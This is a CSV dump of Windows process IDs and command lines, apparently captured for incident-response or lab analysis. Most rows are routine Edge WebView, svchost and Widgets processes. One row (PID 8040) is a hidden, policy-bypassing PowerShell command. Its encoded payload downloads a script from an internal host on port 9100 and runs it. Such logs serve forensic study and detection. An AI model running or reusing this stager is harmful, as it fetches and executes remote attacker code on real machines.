PID,Args
7552,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=renderer --noerrdialogs --user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.18.9.23723; 10.0.0.0.26100.7462) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.26100 IsWebView2/True (WebView2Version 143.0.3650.96)"" --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=SearchHost.exe --webview-exe-version=2125.30600.0.0 --embedded-browser-webview=1 --dma-cps-flags=0 --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags=--expose-gc --device-scale-factor=1.25 --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1766672747649914 --launch-time-ticks=339134123 --ram-no-pressure-read-main-dll --metrics-shmem-handle=3128,i,2155901206106441441,2387164754960857375,2097152 --field-trial-handle=2016,i,14908420433272789986,11771142321928041056,262144 --enable-features=msEdgeFluentOverlayScrollbar --disable-features=msSmartScreenProtection --variations-seed-version --trace-process-track-uuid=3190708990997080739 --mojo-platform-channel-handle=2324 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f /prefetch:1"
7764,C:\\WINDOWS\\uus\\packages\\preview\\AMD64\\MoNotificationUx.exe /NotificationType Reboot_Engaged /FormFactor Passive /CV jFzttogiTkynZKnK.1.0.0
7784,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=gpu-process --noerrdialogs --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=525.31002.10.0 --embedded-browser-webview=1 --no-pre-read-main-dll --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --startup-read-main-dll --metrics-shmem-handle=1636,i,13431424421543783006,4070699426112917213,262144 --field-trial-handle=1916,i,8635894297972141277,11337288381855299968,262144 --variations-seed-version --trace-process-track-uuid=3190708988185955192 --mojo-platform-channel-handle=1912 /prefetch:2 /pfhostedapp:1f3d0ca33106b1de2a6f2986b70740d61f4ac3d5"
7996,C:\\Windows\\System32\\smartscreen.exe -Embedding
8040,powershell.exe  -nop -ep bypass -w 1 -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADEALgAxADIALgA5ADoAOQAxADAAMAAvAGQAbwB3AG4AbABvAGEAZAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALwAnACkALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwB8AGkAZQB4AA==
8064,"""C:\\Program Files\\WindowsApps\\MicrosoftWindows.Client.WebExperience_525.31002.150.0_x64__cw5n1h2txyewy\\Dashboard\\Widgets.exe"" -ServerName:Microsoft.Windows.DashboardServer"
8224,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup
8476,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc
8608,"""C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.23.13503.0_x64__8wekyb3d8bbwe\\WindowsTerminal.exe"" -Embedding"
8796,-
8828,-
8860,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s seclogon
8928,C:\\WINDOWS\\system32\\svchost.exe -k LocalService -p -s NPSMSvc
9020,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --noerrdialogs --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=Widgets.exe --webview-exe-version=525.31002.10.0 --embedded-browser-webview=1 --startup-read-main-dll --metrics-shmem-handle=2188,i,3664577034900219785,321485082541804798,524288 --field-trial-handle=1916,i,8635894297972141277,11337288381855299968,262144 --variations-seed-version --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=2448 /prefetch:13 /pfhostedapp:1f3d0ca33106b1de2a6f2986b70740d61f4ac3d5"
9128,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding
9212,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=renderer --pdf-upsell-enabled --dma-cps-flags=2048 --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags --device-scale-factor=1.25 --num-raster-threads=1 --renderer-client-id=17 --time-ticks-at-unix-epoch=-1766672747649913 --launch-time-ticks=1875289009 --skip-read-main-dll --metrics-shmem-handle=5420,i,13378705701565737419,13584241608047034136,2097152 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190709002241582927 --mojo-platform-channel-handle=6164 /prefetch:1"
9444,C:\\WINDOWS\\system32\\svchost.exe -k wsappx -p -s AppXSvc
